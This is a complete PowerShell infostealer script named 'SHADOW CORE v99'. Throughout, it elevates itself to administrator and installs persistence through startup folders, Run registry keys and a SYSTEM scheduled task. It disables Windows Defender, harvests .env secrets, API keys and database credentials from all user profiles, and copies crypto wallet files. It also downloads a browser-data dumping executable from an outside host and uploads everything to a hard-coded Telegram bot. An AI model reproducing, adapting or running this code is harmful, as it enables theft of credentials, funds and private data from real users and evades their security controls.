#Requires -Version 5.1
# ============================================================
# SHADOW CORE v99 - .ENV EXFILTRATOR (VERBOSE)
# ============================================================

$ErrorActionPreference = 'Continue'
$VerbosePreference = 'Continue'

$BOT_TOKEN = "8421766867:AAF_3BKKFiBoIhaV5PL8YuX1p46Wn-7eUq8"
$CHAT_ID = "7361517001"

if ($MyInvocation.MyCommand.Path) {
    $SCRIPT_PATH = $MyInvocation.MyCommand.Path
} else {
    $SCRIPT_PATH = "$env:AppData\Microsoft\Windows\Update\shadow_core.ps1"
}

$TEMP_DIR = "$env:ProgramData\Microsoft\Windows\Update\data"
$DATA_DIR = "$TEMP_DIR\extracted_data"
$BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"

Write-Host "[VERBOSE] Script Path: $SCRIPT_PATH" -ForegroundColor Cyan
Write-Host "[VERBOSE] Temp Directory: $TEMP_DIR" -ForegroundColor Cyan
Write-Host "[VERBOSE] Data Directory: $DATA_DIR" -ForegroundColor Cyan
Write-Host "[VERBOSE] Browser Tool URL: $BROWSER_DATA_URL" -ForegroundColor Cyan
Write-Host ""

New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
New-Item -ItemType Directory -Force -Path $DATA_DIR | Out-Null

function Test-Admin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Elevate-Admin {
    if (-not (Test-Admin)) {
        Write-Host "[VERBOSE] Not running as admin. Elevating..." -ForegroundColor Yellow
        $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SCRIPT_PATH`""
        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
        exit
    } else {
        Write-Host "[VERBOSE] Running as Administrator." -ForegroundColor Green
    }
}
Elevate-Admin
Write-Host ""

function Add-ToStartup {
    Write-Host "[VERBOSE] Deploying persistence..." -ForegroundColor Yellow
    $success = 0
    $total = 0
    
    # User Startup Folder
    $total++
    try {
        $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $dest = "$startup\WindowsUpdate.exe"
        if (-not (Test-Path $dest)) {
            Copy-Item $SCRIPT_PATH $dest -Force
            attrib +h $dest
            Write-Host "[VERBOSE] [+] User Startup: $dest" -ForegroundColor Green
            $success++
        } else {
            Write-Host "[VERBOSE] [-] User Startup already exists." -ForegroundColor Gray
        }
    } catch {
        Write-Host "[VERBOSE] [-] Failed to copy to User Startup: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # System Startup Folder
    $total++
    try {
        $startup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        $dest = "$startup\SystemMaintenance.exe"
        if (-not (Test-Path $dest)) {
            Copy-Item $SCRIPT_PATH $dest -Force
            attrib +h $dest
            Write-Host "[VERBOSE] [+] System Startup: $dest" -ForegroundColor Green
            $success++
        } else {
            Write-Host "[VERBOSE] [-] System Startup already exists." -ForegroundColor Gray
        }
    } catch {
        Write-Host "[VERBOSE] [-] Failed to copy to System Startup: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # HKCU Registry
    $total++
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCore" -Value "`"$SCRIPT_PATH`"" -Force
        Write-Host "[VERBOSE] [+] HKCU Registry: ShadowCore" -ForegroundColor Green
        $success++
    } catch {
        Write-Host "[VERBOSE] [-] Failed to set HKCU Registry: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # HKLM Registry
    $total++
    try {
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCoreSystem" -Value "`"$SCRIPT_PATH`"" -Force
        Write-Host "[VERBOSE] [+] HKLM Registry: ShadowCoreSystem" -ForegroundColor Green
        $success++
    } catch {
        Write-Host "[VERBOSE] [-] Failed to set HKLM Registry: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Scheduled Task
    $total++
    try {
        $taskName = "ShadowCoreGrabber"
        schtasks /create /tn "$taskName" /tr "`"$SCRIPT_PATH`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
        Write-Host "[VERBOSE] [+] Scheduled Task: $taskName" -ForegroundColor Green
        $success++
    } catch {
        Write-Host "[VERBOSE] [-] Failed to create Scheduled Task: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "[VERBOSE] Persistence: $success/$total methods deployed." -ForegroundColor Yellow
}

function Send-TelegramMessage {
    param([string]$Text)
    try {
        Write-Host "[VERBOSE] Sending Telegram message..." -ForegroundColor Gray
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        $body = @{ chat_id = $CHAT_ID; text = $Text.Substring(0, [Math]::Min($Text.Length, 4000)) } | ConvertTo-Json
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
        Write-Host "[VERBOSE] [+] Message sent." -ForegroundColor Green
    } catch {
        Write-Host "[VERBOSE] [-] Failed to send message: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Send-TelegramFile {
    param([string]$FilePath)
    try {
        Write-Host "[VERBOSE] Preparing to send file: $FilePath" -ForegroundColor Gray
        if (-not (Test-Path $FilePath)) { 
            Write-Host "[VERBOSE] [-] File not found: $FilePath" -ForegroundColor Red
            return $false 
        }
        $fileSize = (Get-Item $FilePath).Length / 1MB
        if ($fileSize -gt 45) { 
            Write-Host "[VERBOSE] [-] File too large: $([math]::Round($fileSize, 1))MB" -ForegroundColor Yellow
            return $false 
        }
        Write-Host "[VERBOSE] File size: $([math]::Round($fileSize, 2))MB" -ForegroundColor Gray
        
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = Split-Path $FilePath -Leaf
        
        Write-Host "[VERBOSE] Uploading $fileName..." -ForegroundColor Gray
        $part1 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$CHAT_ID`r`n")
        $part2 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        
        $body = New-Object System.Collections.ArrayList
        $body.AddRange($part1)
        $body.AddRange($part2)
        $body.AddRange($fileBytes)
        $body.AddRange($footer)
        $bodyBytes = $body.ToArray()
        
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 60 -EA Stop
        Write-Host "[VERBOSE] [+] File sent: $fileName" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[VERBOSE] [-] Failed to send file: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Send-TelegramSummary {
    param([string]$DataSummary, [int]$Sent, [int]$Failed)
    try {
        $hostname = $env:COMPUTERNAME
        $username = $env:USERNAME
        $osInfo = (Get-WmiObject -Class Win32_OperatingSystem -EA SilentlyContinue).Caption
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        $summary = @"
📊 SHADOW CORE v99 - EXFILTRATION COMPLETE

💻 Host: $hostname
👤 Current User: $username
🖥 OS: $osInfo
⏰ Time: $timestamp

📁 Data Collected:
$DataSummary

📤 Sent: $Sent
❌ Failed: $Failed
"@
        Send-TelegramMessage -Text $summary
    } catch {
        Write-Host "[VERBOSE] [-] Failed to send summary: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Get-AllUsers {
    Write-Host "[VERBOSE] Enumerating all users..." -ForegroundColor Yellow
    $users = @()
    $systemDrive = $env:SystemDrive
    
    $usersPath = "$systemDrive\Users"
    if (Test-Path $usersPath) {
        Get-ChildItem $usersPath -Directory | ForEach-Object {
            $user = $_.Name
            $skipUsers = @('Public', 'Default', 'Default User', 'All Users', 'ADMIN$', 'Default.migrated')
            if ($user -notin $skipUsers -and -not $user.StartsWith('.')) {
                $userPath = $_.FullName
                $desktop = "$userPath\Desktop"
                $docs = "$userPath\Documents"
                if ((Test-Path $desktop) -or (Test-Path $docs)) {
                    $users += [PSCustomObject]@{
                        username = $user
                        path = $userPath
                        desktop = $(if (Test-Path $desktop) { $desktop } else { $null })
                        documents = $(if (Test-Path $docs) { $docs } else { $null })
                        downloads = $(if (Test-Path "$userPath\Downloads") { "$userPath\Downloads" } else { $null })
                        appdata = "$userPath\AppData"
                        roaming = "$userPath\AppData\Roaming"
                        localappdata = "$userPath\AppData\Local"
                    }
                    Write-Host "[VERBOSE] Found user: $user" -ForegroundColor Gray
                }
            }
        }
    }
    
    if ($users.Count -eq 0) {
        $currentUser = $env:USERNAME
        $userPath = "$systemDrive\Users\$currentUser"
        if (Test-Path $userPath) {
            $users += [PSCustomObject]@{
                username = $currentUser
                path = $userPath
                desktop = $(if (Test-Path "$userPath\Desktop") { "$userPath\Desktop" } else { $null })
                documents = $(if (Test-Path "$userPath\Documents") { "$userPath\Documents" } else { $null })
                downloads = $(if (Test-Path "$userPath\Downloads") { "$userPath\Downloads" } else { $null })
                appdata = "$userPath\AppData"
                roaming = "$userPath\AppData\Roaming"
                localappdata = "$userPath\AppData\Local"
            }
            Write-Host "[VERBOSE] Added current user: $currentUser" -ForegroundColor Gray
        }
    }
    
    Write-Host "[VERBOSE] Total users found: $($users.Count)" -ForegroundColor Yellow
    return $users
}

function Scan-EnvFiles {
    param($Users)
    Write-Host "`n" + "=" * 80
    Write-Host "🔍 .ENV FILE SCANNER"
    Write-Host "=" * 80
    
    $foundFiles = @()
    
    foreach ($user in $Users) {
        $userName = $user.username
        Write-Host "[VERBOSE] Scanning user: $userName" -ForegroundColor Yellow
        
        $dirsToScan = @(
            $user.path,
            $user.desktop,
            $user.documents,
            $user.downloads,
            $user.roaming,
            $user.localappdata
        ) | Where-Object { $_ -and (Test-Path $_) }
        
        Write-Host "[VERBOSE] Scanning directories: $($dirsToScan.Count) paths" -ForegroundColor Gray
        foreach ($scanDir in $dirsToScan) {
            Write-Host "[VERBOSE] Scanning: $scanDir" -ForegroundColor Gray
            Get-ChildItem -Path $scanDir -Recurse -File -EA SilentlyContinue | ForEach-Object {
                $file = $_.Name
                $fileLower = $file.ToLower()
                if ($fileLower -eq '.env' -or $fileLower.StartsWith('.env') -or $fileLower.EndsWith('.env') -or $fileLower.Contains('.env.')) {
                    $filePath = $_.FullName
                    if ($_.Length -gt 0) {
                        $foundFiles += [PSCustomObject]@{
                            Path = $filePath
                            Name = $file
                            Size = $_.Length
                            User = $userName
                            Directory = $_.DirectoryName
                        }
                        Write-Host "[VERBOSE] ✅ Found: $filePath" -ForegroundColor Green
                    }
                }
            }
        }
    }
    
    Write-Host "[VERBOSE] Total .env files found: $($foundFiles.Count)" -ForegroundColor Yellow
    return $foundFiles
}

function Extract-Secrets {
    param($EnvFiles)
    Write-Host "`n" + "=" * 80
    Write-Host "🔑 EXTRACTING SECRETS FROM .ENV FILES"
    Write-Host "=" * 80
    
    $patterns = @(
        @{Name='AWS_Key'; Pattern='AKIA[0-9A-Z]{16}'},
        @{Name='AWS_Secret'; Pattern='AWS_SECRET[=:]\s*[A-Za-z0-9/+=]+'},
        @{Name='Google_API'; Pattern='AIza[0-9A-Za-z\-_]{35}'},
        @{Name='GitHub_Token'; Pattern='ghp_[0-9A-Za-z]{36}'},
        @{Name='Slack_Token'; Pattern='xox[baprs]-[0-9A-Za-z\-]+'},
        @{Name='Discord_Bot'; Pattern='[A-Za-z0-9\-_]{24}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}'},
        @{Name='Stripe_Key'; Pattern='sk_live_[0-9A-Za-z]{24}'},
        @{Name='JWT_Token'; Pattern='eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'},
        @{Name='Bearer_Token'; Pattern='Bearer [A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'},
        @{Name='API_Key'; Pattern='API[_-]?KEY[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Secret_Key'; Pattern='SECRET[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Token'; Pattern='TOKEN[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Password'; Pattern='PASSWORD[=:]\s*[A-Za-z0-9!@#$%^&*()\-_]{8,}'},
        @{Name='Mongo_URI'; Pattern='mongodb://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='MySQL_URI'; Pattern='mysql://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='Postgres_URI'; Pattern='postgresql://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='Redis_URI'; Pattern='redis://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='DB_URL'; Pattern='DATABASE_URL[=:]\s*[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='DB_USER'; Pattern='DB_USER[=:]\s*[A-Za-z0-9\-_]{3,}'},
        @{Name='DB_PASS'; Pattern='DB_PASS[=:]\s*[A-Za-z0-9!@#$%^&*()\-_]{3,}'},
        @{Name='API_URL'; Pattern='API_URL[=:]\s*https?://[A-Za-z0-9\-_.]+'},
        @{Name='CLIENT_ID'; Pattern='CLIENT_ID[=:]\s*[A-Za-z0-9\-_.]+'},
        @{Name='CLIENT_SECRET'; Pattern='CLIENT_SECRET[=:]\s*[A-Za-z0-9\-_.]+'}
    )
    
    $secretsFile = "$DATA_DIR\secrets_from_env.txt"
    $foundSecrets = 0
    
    foreach ($envFile in $EnvFiles) {
        $filePath = $envFile.Path
        if (-not (Test-Path $filePath)) { continue }
        
        try {
            $content = Get-Content $filePath -Raw -Encoding UTF8 -EA SilentlyContinue
            $lines = $content -split "`n"
            $secretsInFile = @()
            
            foreach ($line in $lines) {
                $line = $line.Trim()
                if (-not $line -or $line.StartsWith('#')) { continue }
                if ($line -notmatch '=') { continue }
                
                $parts = $line -split '=', 2
                $key = $parts[0].Trim()
                $value = $parts[1].Trim()
                
                foreach ($pattern in $patterns) {
                    if ($line -match $pattern.Pattern) {
                        $display = "$key=$value"
                        if ($display.Length -gt 60) { $display = $display.Substring(0, 60) + "..." }
                        $secretsInFile += "$($pattern.Name): $display"
                        break
                    }
                }
            }
            
            if ($secretsInFile.Count -gt 0) {
                Add-Content -Path $secretsFile -Value "`n$('=' * 80)" -Encoding UTF8
                Add-Content -Path $secretsFile -Value "File: $filePath" -Encoding UTF8
                Add-Content -Path $secretsFile -Value "$('=' * 80)" -Encoding UTF8
                foreach ($secret in $secretsInFile[0..19]) {
                    Add-Content -Path $secretsFile -Value "  $secret" -Encoding UTF8
                }
                $foundSecrets += $secretsInFile.Count
                Write-Host "[VERBOSE] [+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)" -ForegroundColor Green
            }
        } catch {
            Write-Host "[VERBOSE] [-] Error extracting secrets from $filePath: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    if ($foundSecrets -gt 0 -and (Test-Path $secretsFile)) {
        Write-Host "[VERBOSE] Total secrets found: $foundSecrets" -ForegroundColor Yellow
        return $secretsFile
    }
    return $null
}

function Extract-Wallets {
    param($Users)
    Write-Host "`n" + "=" * 80
    Write-Host "💰 WALLET SCANNING"
    Write-Host "=" * 80
    
    $walletPatterns = @{
        'Bitcoin' = @('Roaming\Bitcoin\wallet.dat')
        'Ethereum' = @('Roaming\Ethereum\keystore\*.json')
        'Exodus' = @('Roaming\Exodus\*.dat')
        'Atomic' = @('Roaming\Atomic\*.dat')
        'Electrum' = @('Roaming\Electrum\wallets\*.dat')
        'Monero' = @('Roaming\monero\*.wallet')
        'Trust Wallet' = @('Roaming\Trust Wallet\*.dat')
    }
    
    $foundFiles = @()
    $walletDir = "$DATA_DIR\wallets"
    New-Item -ItemType Directory -Force -Path $walletDir | Out-Null
    
    foreach ($user in $Users) {
        $userName = $user.username
        $base = $user.roaming
        if (-not $base) { continue }
        
        Write-Host "[VERBOSE] Scanning wallets for user: $userName" -ForegroundColor Yellow
        foreach ($walletName in $walletPatterns.Keys) {
            $patterns = $walletPatterns[$walletName]
            foreach ($pattern in $patterns) {
                $fullPattern = "$base\$pattern"
                Write-Host "[VERBOSE] Checking pattern: $fullPattern" -ForegroundColor Gray
                Get-ChildItem -Path $fullPattern -File -EA SilentlyContinue | ForEach-Object {
                    if ($_.Length -gt 0) {
                        $dest = "$walletDir\$userName\$walletName\$($_.Name)"
                        $destDir = Split-Path $dest -Parent
                        New-Item -ItemType Directory -Force -Path $destDir | Out-Null
                        Copy-Item $_.FullName $dest -Force
                        $foundFiles += $dest
                        Write-Host "[VERBOSE] [+] ${walletName}: $($_.Name)" -ForegroundColor Green
                    }
                }
            }
        }
    }
    
    Write-Host "[VERBOSE] Total wallets found: $($foundFiles.Count)" -ForegroundColor Yellow
    return $foundFiles
}

function Download-BrowserTool {
    $output = "$TEMP_DIR\hack-browser-data.exe"
    Write-Host "[VERBOSE] Browser tool path: $output" -ForegroundColor Gray
    
    if (Test-Path $output) {
        Write-Host "[VERBOSE] Existing browser tool found. Removing..." -ForegroundColor Yellow
        try { 
            attrib -r -h -s $output
            Remove-Item $output -Force
            Write-Host "[VERBOSE] [+] Removed existing file." -ForegroundColor Green
        } catch {
            Write-Host "[VERBOSE] [-] Could not remove existing file: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    Write-Host "[VERBOSE] Downloading hack-browser-data.exe from $BROWSER_DATA_URL..." -ForegroundColor Yellow
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($BROWSER_DATA_URL, $output)
        Write-Host "[VERBOSE] [+] Downloaded: $output" -ForegroundColor Green
        
        # Verify the file exists and has a valid size
        if (Test-Path $output) {
            $fileSize = (Get-Item $output).Length
            Write-Host "[VERBOSE] File size: $fileSize bytes" -ForegroundColor Gray
            if ($fileSize -gt 0) {
                Write-Host "[VERBOSE] [+] Download successful. File is valid." -ForegroundColor Green
            } else {
                Write-Host "[VERBOSE] [-] Downloaded file is empty!" -ForegroundColor Red
                return $null
            }
        }
        return $output
    } catch {
        Write-Host "[VERBOSE] [-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Extract-BrowserData {
    param([string]$ExePath)
    Write-Host "`n" + "=" * 80
    Write-Host "🌐 BROWSER DATA EXTRACTION"
    Write-Host "=" * 80
    
    Write-Host "[VERBOSE] Killing browser processes..." -ForegroundColor Yellow
    @('chrome.exe', 'msedge.exe', 'brave.exe', 'firefox.exe', 'opera.exe') | ForEach-Object {
        try { 
            Stop-Process -Name $_.Replace('.exe', '') -Force -EA SilentlyContinue
            Write-Host "[VERBOSE] [-] Killed: $_" -ForegroundColor Gray
        } catch {
            Write-Host "[VERBOSE] [-] Could not kill: $_ (may not be running)" -ForegroundColor Gray
        }
    }
    
    $browserDir = "$DATA_DIR\browser"
    New-Item -ItemType Directory -Force -Path $browserDir | Out-Null
    Write-Host "[VERBOSE] Browser data output directory: $browserDir" -ForegroundColor Gray
    
    Push-Location $browserDir
    
    try {
        Write-Host "[VERBOSE] Executing: $ExePath dump -b all -c all -d . -f json --zip" -ForegroundColor Yellow
        $process = Start-Process -FilePath $ExePath -ArgumentList "dump -b all -c all -d . -f json --zip" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$browserDir\output.log" -RedirectStandardError "$browserDir\error.log"
        Write-Host "[VERBOSE] Process exited with code: $($process.ExitCode)" -ForegroundColor Gray
        
        $foundFiles = @()
        Get-ChildItem -Path $browserDir -Recurse -File | Where-Object { $_.Extension -match '\.(json|zip|csv)$' } | ForEach-Object {
            $foundFiles += $_.FullName
            Write-Host "[VERBOSE] Found output file: $($_.FullName)" -ForegroundColor Gray
        }
        
        if ($foundFiles.Count -gt 0) {
            Write-Host "[VERBOSE] [+] Found $($foundFiles.Count) browser data files" -ForegroundColor Green
        } else {
            Write-Host "[VERBOSE] [-] No browser data files found." -ForegroundColor Yellow
            # Check if error.log exists for debugging
            if (Test-Path "$browserDir\error.log") {
                Write-Host "[VERBOSE] Error log content:" -ForegroundColor Red
                Get-Content "$browserDir\error.log" | ForEach-Object { Write-Host "[VERBOSE] $_" -ForegroundColor Red }
            }
        }
        Pop-Location
        return $foundFiles
    } catch {
        Write-Host "[VERBOSE] [-] Browser extraction failed: $($_.Exception.Message)" -ForegroundColor Red
        Pop-Location
        return @()
    }
}

function Send-FilesIndividually {
    param($FileList, $CategoryName = "Files")
    
    Write-Host "[VERBOSE] Sending $($FileList.Count) $CategoryName files..." -ForegroundColor Yellow
    $sent = 0
    $failed = 0
    $i = 0
    
    foreach ($filePath in $FileList) {
        $i++
        if (-not (Test-Path $filePath)) { 
            Write-Host "[VERBOSE] [$i/$($FileList.Count)] File not found: $filePath" -ForegroundColor Red
            $failed++
            continue 
        }
        
        try {
            $fileSize = (Get-Item $filePath).Length / 1MB
            if ($fileSize -gt 45) {
                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ⚠️ Skipping $(Split-Path $filePath -Leaf) - $([math]::Round($fileSize, 1))MB" -ForegroundColor Yellow
                $failed++
                continue
            }
            
            Write-Host "[VERBOSE] [$i/$($FileList.Count)] 📤 Sending: $(Split-Path $filePath -Leaf) ($([math]::Round($fileSize, 2))MB)" -ForegroundColor Gray
            if (Send-TelegramFile -FilePath $filePath) {
                $sent++
                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ✅ Sent" -ForegroundColor Green
            } else {
                $failed++
                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ❌ Failed to send" -ForegroundColor Red
            }
            Start-Sleep -Milliseconds 500
        } catch {
            $failed++
            Write-Host "[VERBOSE] [$i/$($FileList.Count)] ❌ Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    Write-Host "[VERBOSE] $CategoryName: Sent $sent, Failed $failed" -ForegroundColor Yellow
    return @{ Sent = $sent; Failed = $failed }
}

function Main {
    Write-Host "=" * 80
    Write-Host "SHADOW CORE v99 - FINAL EXFILTRATOR (VERBOSE)"
    Write-Host "PS1: $SCRIPT_PATH"
    Write-Host "=" * 80
    Write-Host ""
    
    Write-Host "[PHASE 0] DETECTING ALL USERS"
    Write-Host "-" * 80
    $users = Get-AllUsers
    Write-Host "[VERBOSE] Found $($users.Count) user profile(s)" -ForegroundColor Yellow
    foreach ($user in $users) { Write-Host "    - $($user.username)" }
    Write-Host ""
    
    Write-Host "[PHASE 1] PERSISTENCE DEPLOYMENT"
    Write-Host "-" * 80
    Add-ToStartup
    Write-Host ""
    
    Write-Host "[PHASE 2] DISABLING DEFENDER"
    Write-Host "-" * 80
    try {
        Write-Host "[VERBOSE] Disabling Defender real-time monitoring..." -ForegroundColor Yellow
        powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true" -EA SilentlyContinue
        Write-Host "[VERBOSE] Adding exclusion path: $TEMP_DIR" -ForegroundColor Yellow
        powershell -Command "Add-MpPreference -ExclusionPath '$TEMP_DIR'" -EA SilentlyContinue
        Write-Host "[VERBOSE] Adding exclusion process: shadow_core.ps1" -ForegroundColor Yellow
        powershell -Command "Add-MpPreference -ExclusionProcess 'shadow_core.ps1'" -EA SilentlyContinue
        Write-Host "[VERBOSE] [+] Defender disabled" -ForegroundColor Green
    } catch {
        Write-Host "[VERBOSE] [-] Failed to disable Defender: $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host ""
    
    $dataSummaryItems = @()
    $totalSent = 0
    $totalFailed = 0
    
    Write-Host "[PHASE 3] .ENV FILE SCANNING"
    Write-Host "-" * 80
    $envFiles = Scan-EnvFiles -Users $users
    $envFilePaths = @()
    
    if ($envFiles.Count -gt 0) {
        $envCopyDir = "$DATA_DIR\env_files"
        New-Item -ItemType Directory -Force -Path $envCopyDir | Out-Null
        Write-Host "[VERBOSE] Copying .env files to $envCopyDir..." -ForegroundColor Yellow
        
        foreach ($fileInfo in $envFiles) {
            try {
                $src = $fileInfo.Path
                if ($src -and (Test-Path $src)) {
                    $userName = $fileInfo.User
                    $userDir = "$envCopyDir\$userName"
                    New-Item -ItemType Directory -Force -Path $userDir | Out-Null
                    $dest = "$userDir\$(Split-Path $src -Leaf)"
                    Copy-Item $src $dest -Force
                    $envFilePaths += $dest
                    Write-Host "[VERBOSE] [+] Copied: $(Split-Path $src -Leaf) ($userName)" -ForegroundColor Green
                }
            } catch {
                Write-Host "[VERBOSE] [-] Failed to copy: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        $dataSummaryItems += "📁 .env Files: $($envFilePaths.Count) files"
        
        $secretsFile = Extract-Secrets -EnvFiles $envFiles
        if ($secretsFile -and (Test-Path $secretsFile)) {
            $envFilePaths += $secretsFile
            $dataSummaryItems += "🔑 Secrets extracted"
            Write-Host "[VERBOSE] [+] Secrets file: $secretsFile" -ForegroundColor Green
        }
        
        if ($envFilePaths.Count -gt 0) {
            $result = Send-FilesIndividually -FileList $envFilePaths -CategoryName ".env"
            $totalSent += $result.Sent
            $totalFailed += $result.Failed
        }
    } else {
        Write-Host "[VERBOSE] [-] No .env files found." -ForegroundColor Yellow
    }
    Write-Host ""
    
    Write-Host "[PHASE 4] WALLET SCANNING"
    Write-Host "-" * 80
    $walletFiles = Extract-Wallets -Users $users
    if ($walletFiles.Count -gt 0) {
        $dataSummaryItems += "💰 Wallets: $($walletFiles.Count) files"
        $result = Send-FilesIndividually -FileList $walletFiles -CategoryName "Wallet"
        $totalSent += $result.Sent
        $totalFailed += $result.Failed
    }
    Write-Host ""
    
    Write-Host "[PHASE 5] BROWSER DATA EXTRACTION"
    Write-Host "-" * 80
    $exePath = Download-BrowserTool
    if ($exePath) {
        Write-Host "[VERBOSE] [+] Browser tool downloaded successfully." -ForegroundColor Green
        $browserFiles = Extract-BrowserData -ExePath $exePath
        if ($browserFiles.Count -gt 0) {
            $dataSummaryItems += "🌐 Browser Data: $($browserFiles.Count) files"
            $result = Send-FilesIndividually -FileList $browserFiles -CategoryName "Browser"
            $totalSent += $result.Sent
            $totalFailed += $result.Failed
        } else {
            Write-Host "[VERBOSE] [-] No browser data files extracted." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[VERBOSE] [-] Browser tool download failed. Skipping browser data extraction." -ForegroundColor Red
    }
    Write-Host ""
    
    Write-Host "[PHASE 6] SENDING SUMMARY"
    Write-Host "-" * 80
    $summaryText = ($dataSummaryItems -join "`n") + "`n`n📤 Sent: $totalSent`n❌ Failed: $totalFailed"
    Send-TelegramSummary -DataSummary ($dataSummaryItems -join "`n") -Sent $totalSent -Failed $totalFailed
    
    Write-Host ""
    Write-Host "=" * 80
    Write-Host "EXFILTRATION COMPLETE"
    Write-Host "📤 Sent: $totalSent"
    Write-Host "❌ Failed: $totalFailed"
    Write-Host "=" * 80
    Write-Host "[VERBOSE] Script will now persist and run every hour." -ForegroundColor Cyan
    
    while ($true) { 
        Write-Host "[VERBOSE] Sleeping for 3600 seconds..." -ForegroundColor Gray
        Start-Sleep -Seconds 3600 
    }
}

try {
    Main
} catch {
    Write-Host "[VERBOSE] [!] FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[VERBOSE] [!] Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor Red
    Start-Sleep -Seconds 10
    Main
}
